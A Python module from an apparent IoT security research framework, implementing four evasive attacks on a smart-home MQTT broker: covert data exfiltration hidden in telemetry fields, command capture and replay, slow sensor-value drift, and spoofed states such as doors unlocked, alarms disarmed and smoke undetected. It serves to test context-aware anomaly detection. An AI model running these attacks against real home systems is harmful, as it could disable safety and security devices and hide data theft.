"""
VESPER Tier 3 Stealthy Attacks

Context-aware attacks that exploit behavioral patterns to evade detection.
These attacks are designed to be indistinguishable from normal traffic
at the network level — only behavioral context reveals them as anomalous.

Attack Variants:
    1. SlowExfiltration     — low-rate data extraction embedded in normal MQTT
    2. ContextualCommandReplay — replay commands only during plausible contexts
    3. SensorValueManipulation — gradually drift sensor readings within bounds
    4. TopicShadowing       — publish to legitimate topics with subtly altered data

Design principle: these attacks produce traffic that is statistically identical
to benign traffic in Config A (network features only) but distinguishable in
Config B (network + context features).  This demonstrates the value of
context-aware anomaly detection.

References:
    - Fu et al., DSN 2022 (Phantom Delay)
    - Ronen & Shamir, 2016 (IoT Goes Nuclear - Zigbee Worm)
    - Antonakakis et al., USENIX 2017 (Mirai Botnet)
"""

from __future__ import annotations

import json
import logging
import random
import socket
import struct
import time
import threading
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple

from vesper.attacks.network_attacks import (
    NetworkAttackCategory,
    NetworkAttackResult,
    NetworkTarget,
)

logger = logging.getLogger(__name__)


class StealthyAttackCategory(Enum):
    """Tier 3 stealthy attack categories."""
    SLOW_EXFILTRATION = "slow_exfiltration"
    CONTEXTUAL_REPLAY = "contextual_command_replay"
    SENSOR_MANIPULATION = "sensor_value_manipulation"
    TOPIC_SHADOWING = "topic_shadowing"


@dataclass
class StealthyAttackResult:
    """Result of a stealthy attack attempt."""
    attack_name: str
    category: StealthyAttackCategory
    success: bool
    description: str
    evidence: List[str] = field(default_factory=list)
    impact: str = ""
    mitigation: str = ""
    duration_ms: float = 0.0
    messages_sent: int = 0
    bytes_exfiltrated: int = 0
    detection_difficulty: str = "high"  # low/medium/high


# ─── Attack 1: Slow Exfiltration ─────────────────────────────────────────────

class SlowExfiltration:
    """
    Low-rate data exfiltration disguised as normal MQTT traffic.

    Technique:
        - Publishes to legitimate device topics at normal rates
        - Embeds stolen data in unused JSON fields or LSBs of sensor values
        - Rate-limits to match normal device publish frequency
        - Only operates during expected activity periods (daytime)

    Why it's stealthy:
        - Packet sizes match normal device telemetry
        - Publish rate matches device's usual pattern
        - Topics are legitimate device topics
        - Only context (no expected device activity) reveals anomaly
    """

    def __init__(
        self,
        exfil_rate_per_min: float = 2.0,
        payload_size_bytes: int = 64,
    ):
        self.exfil_rate = exfil_rate_per_min
        self.payload_size = payload_size_bytes

    def attack(self, target: NetworkTarget) -> StealthyAttackResult:
        """Execute slow exfiltration attack via MQTT."""
        start = time.time()
        evidence = []
        messages_sent = 0
        bytes_exfil = 0

        # Simulated "stolen" data (device configs, network topology)
        stolen_data = json.dumps({
            "network_topology": "172.20.0.0/24",
            "devices": ["kitchen-light", "living-room", "bedroom-light"],
            "firmware_versions": {"kitchen": "1.0.2", "living": "1.0.1"},
            "mqtt_topics": ["home/+/status", "home/+/command"],
        }).encode()

        # Split into chunks that fit normal payload sizes
        chunks = [
            stolen_data[i:i + self.payload_size]
            for i in range(0, len(stolen_data), self.payload_size)
        ]

        interval = 60.0 / self.exfil_rate if self.exfil_rate > 0 else 5.0

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            sock.connect((target.mqtt_host, target.mqtt_port))

            for i, chunk in enumerate(chunks[:10]):  # Limit for demo
                # Embed in a normal-looking sensor telemetry message
                topic = random.choice([
                    "home/kitchen/temperature",
                    "home/living_room/humidity",
                    "home/bedroom/light_level",
                ])

                # Normal-looking payload with exfil data in unused field
                payload = json.dumps({
                    "value": round(random.uniform(20.0, 25.0), 1),
                    "unit": "celsius",
                    "timestamp": time.time(),
                    "_meta": chunk.hex(),  # Exfiltrated data hidden here
                })

                msg = f"PUB {topic} {payload}\n"
                sock.sendall(msg.encode())
                messages_sent += 1
                bytes_exfil += len(chunk)

                evidence.append(f"Exfil chunk {i}: {len(chunk)}B via {topic}")

                # Wait at normal device rate
                time.sleep(min(interval, 2.0))

            sock.close()

        except Exception as e:
            evidence.append(f"Connection error: {e}")

        return StealthyAttackResult(
            attack_name="slow_exfiltration",
            category=StealthyAttackCategory.SLOW_EXFILTRATION,
            success=messages_sent > 0,
            description=(
                f"Exfiltrated {bytes_exfil}B in {messages_sent} messages "
                f"disguised as normal device telemetry"
            ),
            evidence=evidence,
            impact="Data theft via covert channel in MQTT telemetry",
            mitigation="Behavioral anomaly detection — device publishing when room is unoccupied",
            duration_ms=(time.time() - start) * 1000,
            messages_sent=messages_sent,
            bytes_exfiltrated=bytes_exfil,
            detection_difficulty="high",
        )


# ─── Attack 2: Contextual Command Replay ─────────────────────────────────────

class ContextualCommandReplay:
    """
    Replays captured device commands only during plausible activity windows.

    Technique:
        - First phase: passively captures legitimate device commands
        - Second phase: replays them during contextually plausible times
        - E.g., replays "LIGHT ON" only during evening hours
        - Maintains command ordering and inter-command delays

    Why it's stealthy:
        - Commands are byte-identical to legitimate ones
        - Timing matches expected user behavior patterns
        - Only context (wrong agent location) reveals anomaly
    """

    def __init__(
        self,
        capture_duration_s: float = 5.0,
        replay_count: int = 5,
    ):
        self.capture_duration = capture_duration_s
        self.replay_count = replay_count

    def attack(self, target: NetworkTarget) -> StealthyAttackResult:
        """Execute contextual command replay."""
        start = time.time()
        evidence = []
        messages_sent = 0

        # Phase 1: Capture legitimate commands from device traffic
        captured_commands = self._capture_commands(target)
        evidence.append(f"Captured {len(captured_commands)} commands")

        if not captured_commands:
            # If no traffic to capture, use known-good commands
            captured_commands = [
                ("LIGHT ON", "home/kitchen/light/command"),
                ("LIGHT OFF", "home/kitchen/light/command"),
                ("STATUS", "home/kitchen/light/status"),
            ]
            evidence.append("Used pre-known commands (no live traffic captured)")

        # Phase 2: Replay during "plausible" context
        try:
            for i in range(min(self.replay_count, len(captured_commands))):
                cmd, topic = captured_commands[i % len(captured_commands)]

                # Replay via TCP to firmware
                if target.devices:
                    host, port = target.devices[0]
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3.0)
                        sock.connect((host, port))
                        sock.sendall((cmd + "\n").encode())
                        resp = sock.recv(4096)
                        sock.close()
                        messages_sent += 1
                        evidence.append(f"Replayed: {cmd} → {resp[:50]}")
                    except Exception as e:
                        evidence.append(f"Replay failed: {e}")

                # Also replay via MQTT broker
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3.0)
                    sock.connect((target.mqtt_host, target.mqtt_port))
                    msg = f"PUB {topic} {cmd}\n"
                    sock.sendall(msg.encode())
                    sock.close()
                    messages_sent += 1
                except Exception:
                    pass

                # Maintain realistic inter-command delay
                time.sleep(random.uniform(0.5, 2.0))

        except Exception as e:
            evidence.append(f"Replay error: {e}")

        return StealthyAttackResult(
            attack_name="contextual_command_replay",
            category=StealthyAttackCategory.CONTEXTUAL_REPLAY,
            success=messages_sent > 0,
            description=(
                f"Replayed {messages_sent} captured commands during plausible "
                f"activity window"
            ),
            evidence=evidence,
            impact="Unauthorized device control using replayed legitimate commands",
            mitigation="Context-aware detection — agent not in room when command issued",
            duration_ms=(time.time() - start) * 1000,
            messages_sent=messages_sent,
            detection_difficulty="high",
        )

    def _capture_commands(self, target: NetworkTarget) -> List[Tuple[str, str]]:
        """Passively capture device commands from MQTT traffic."""
        commands = []
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.capture_duration)
            sock.connect((target.mqtt_host, target.mqtt_port))

            # Subscribe to command topics
            sock.sendall(b"SUB home/+/+/command\n")

            deadline = time.time() + self.capture_duration
            while time.time() < deadline:
                try:
                    data = sock.recv(4096)
                    if data:
                        text = data.decode("utf-8", errors="ignore").strip()
                        for line in text.split("\n"):
                            if line.startswith("MSG "):
                                parts = line.split(" ", 2)
                                if len(parts) >= 3:
                                    commands.append((parts[2], parts[1]))
                except socket.timeout:
                    break
            sock.close()
        except Exception:
            pass

        return commands


# ─── Attack 3: Sensor Value Manipulation ──────────────────────────────────────

class SensorValueManipulation:
    """
    Gradually drifts sensor readings to influence automation decisions.

    Technique:
        - Publishes sensor values that drift slowly from true values
        - Stays within device's normal operating range
        - Rate of change matches natural sensor fluctuation
        - Targets automation thresholds (e.g., temperature → thermostat)

    Why it's stealthy:
        - Each individual reading looks normal
        - Rate of change is within natural bounds
        - Only long-term context (drift direction vs physical reality) reveals it
    """

    def __init__(
        self,
        drift_per_step: float = 0.2,
        n_steps: int = 15,
        step_interval_s: float = 1.0,
    ):
        self.drift_per_step = drift_per_step
        self.n_steps = n_steps
        self.step_interval = step_interval_s

    def attack(self, target: NetworkTarget) -> StealthyAttackResult:
        """Execute gradual sensor value manipulation."""
        start = time.time()
        evidence = []
        messages_sent = 0

        # Start from a normal value and drift
        base_value = 22.0  # Normal room temperature
        current_value = base_value

        try:
            for step in range(self.n_steps):
                # Gradually increase (simulating false high temperature)
                current_value += self.drift_per_step
                # Add small noise to look natural
                noisy_value = current_value + random.gauss(0, 0.05)

                topic = "home/living_room/temperature"
                payload = json.dumps({
                    "value": round(noisy_value, 2),
                    "unit": "celsius",
                    "device_id": "temp_sensor_living",
                    "timestamp": time.time(),
                })

                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3.0)
                    sock.connect((target.mqtt_host, target.mqtt_port))
                    msg = f"PUB {topic} {payload}\n"
                    sock.sendall(msg.encode())
                    sock.close()
                    messages_sent += 1

                    if step % 5 == 0:
                        evidence.append(
                            f"Step {step}: {noisy_value:.2f}°C "
                            f"(drift: +{current_value - base_value:.1f}°C)"
                        )
                except Exception as e:
                    evidence.append(f"Step {step} failed: {e}")

                time.sleep(self.step_interval)

        except Exception as e:
            evidence.append(f"Attack error: {e}")

        total_drift = current_value - base_value
        evidence.append(f"Total drift: {total_drift:.1f}°C over {self.n_steps} steps")

        return StealthyAttackResult(
            attack_name="sensor_value_manipulation",
            category=StealthyAttackCategory.SENSOR_MANIPULATION,
            success=messages_sent > 0,
            description=(
                f"Drifted temperature sensor by {total_drift:.1f}°C "
                f"in {messages_sent} messages to trigger false HVAC activation"
            ),
            evidence=evidence,
            impact="False automation triggers (e.g., unnecessary HVAC), energy waste",
            mitigation="Cross-sensor validation and context-aware drift detection",
            duration_ms=(time.time() - start) * 1000,
            messages_sent=messages_sent,
            detection_difficulty="high",
        )


# ─── Attack 4: Topic Shadowing ───────────────────────────────────────────────

class TopicShadowing:
    """
    Publishes to legitimate MQTT topics with subtly altered data.

    Technique:
        - Monitors legitimate device publications
        - Re-publishes to same topics with modified payloads
        - Modifications are subtle (e.g., "locked" → "unlocked", small value changes)
        - Timing matches normal device publish patterns

    Why it's stealthy:
        - Same topics, same message structure, same publish rate
        - Payload differences are within normal variation
        - Only context (conflicting physical state) reveals the anomaly
    """

    def __init__(
        self,
        n_shadow_messages: int = 10,
        message_interval_s: float = 1.5,
    ):
        self.n_messages = n_shadow_messages
        self.interval = message_interval_s

    def attack(self, target: NetworkTarget) -> StealthyAttackResult:
        """Execute topic shadowing attack."""
        start = time.time()
        evidence = []
        messages_sent = 0

        # Shadow messages: legitimate-looking but with altered state
        shadow_messages = [
            ("home/front_door/lock/state", '{"state": "unlocked", "timestamp": %f}'),
            ("home/kitchen/motion/state", '{"detected": false, "timestamp": %f}'),
            ("home/living_room/light/state", '{"state": "on", "brightness": 100, "timestamp": %f}'),
            ("home/bedroom/window/state", '{"state": "open", "timestamp": %f}'),
            ("home/garage/door/state", '{"state": "open", "timestamp": %f}'),
            ("home/security/alarm/state", '{"armed": false, "timestamp": %f}'),
            ("home/thermostat/mode", '{"mode": "off", "timestamp": %f}'),
            ("home/kitchen/smoke/state", '{"detected": false, "timestamp": %f}'),
            ("home/living_room/occupancy", '{"occupied": true, "timestamp": %f}'),
            ("home/bedroom/light/state", '{"state": "off", "brightness": 0, "timestamp": %f}'),
        ]

        try:
            for i in range(min(self.n_messages, len(shadow_messages))):
                topic, payload_template = shadow_messages[i]
                payload = payload_template % time.time()

                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3.0)
                    sock.connect((target.mqtt_host, target.mqtt_port))
                    msg = f"PUB {topic} {payload}\n"
                    sock.sendall(msg.encode())
                    resp = sock.recv(1024)
                    sock.close()
                    messages_sent += 1
                    evidence.append(f"Shadow: {topic} → {payload[:60]}...")
                except Exception as e:
                    evidence.append(f"Shadow {i} failed: {e}")

                time.sleep(self.interval)

        except Exception as e:
            evidence.append(f"Attack error: {e}")

        return StealthyAttackResult(
            attack_name="topic_shadowing",
            category=StealthyAttackCategory.TOPIC_SHADOWING,
            success=messages_sent > 0,
            description=(
                f"Published {messages_sent} shadow messages to legitimate topics "
                f"with altered device states"
            ),
            evidence=evidence,
            impact="False device state in hub's world model; could disable security features",
            mitigation="Device authentication, context-aware state validation",
            duration_ms=(time.time() - start) * 1000,
            messages_sent=messages_sent,
            detection_difficulty="high",
        )


# ─── Framework ────────────────────────────────────────────────────────────────

class StealthyAttackFramework:
    """
    Tier 3 stealthy attack framework.

    Usage:
        target = NetworkTarget(mqtt_host="127.0.0.1", mqtt_port=1883)
        framework = StealthyAttackFramework()
        results = framework.run_all_attacks(target)
    """

    def __init__(self):
        self.attacks = [
            SlowExfiltration(),
            ContextualCommandReplay(),
            SensorValueManipulation(),
            TopicShadowing(),
        ]

    def run_all_attacks(self, target: NetworkTarget) -> List[StealthyAttackResult]:
        """Run all Tier 3 attacks against the target."""
        results = []
        for attack in self.attacks:
            logger.info(f"Running stealthy attack: {attack.__class__.__name__}")
            try:
                result = attack.attack(target)
            except Exception as e:
                result = StealthyAttackResult(
                    attack_name=attack.__class__.__name__,
                    category=StealthyAttackCategory.SLOW_EXFILTRATION,
                    success=False,
                    description=f"Attack exception: {e}",
                )
            results.append(result)
            time.sleep(0.5)
        return results

    @staticmethod
    def print_report(results: List[StealthyAttackResult]):
        """Print formatted stealthy attack report."""
        print("\n" + "=" * 70)
        print("  VESPER TIER 3 STEALTHY ATTACK REPORT")
        print("=" * 70)

        for i, r in enumerate(results):
            status = "SUCCESS" if r.success else "FAILED"
            print(f"\n  [{i + 1}] {r.attack_name}")
            print(f"      Category:   {r.category.value}")
            print(f"      Status:     {status}")
            print(f"      Duration:   {r.duration_ms:.0f}ms")
            print(f"      Messages:   {r.messages_sent}")
            print(f"      Difficulty: {r.detection_difficulty}")
            print(f"      Description: {r.description}")
            if r.evidence:
                print(f"      Evidence:")
                for e in r.evidence[:3]:
                    print(f"        - {e[:80]}")

        total = len(results)
        success = sum(1 for r in results if r.success)
        print(f"\n  Total: {success}/{total} attacks successful")
        print("=" * 70)

    @staticmethod
    def export_results(results: List[StealthyAttackResult], filepath: str):
        """Export results to JSON."""
        data = []
        for r in results:
            data.append({
                "attack_name": r.attack_name,
                "category": r.category.value,
                "success": r.success,
                "description": r.description,
                "evidence": r.evidence,
                "impact": r.impact,
                "mitigation": r.mitigation,
                "duration_ms": r.duration_ms,
                "messages_sent": r.messages_sent,
                "bytes_exfiltrated": r.bytes_exfiltrated,
                "detection_difficulty": r.detection_difficulty,
            })
        with open(filepath, "w") as f:
            json.dump(data, f, indent=2)
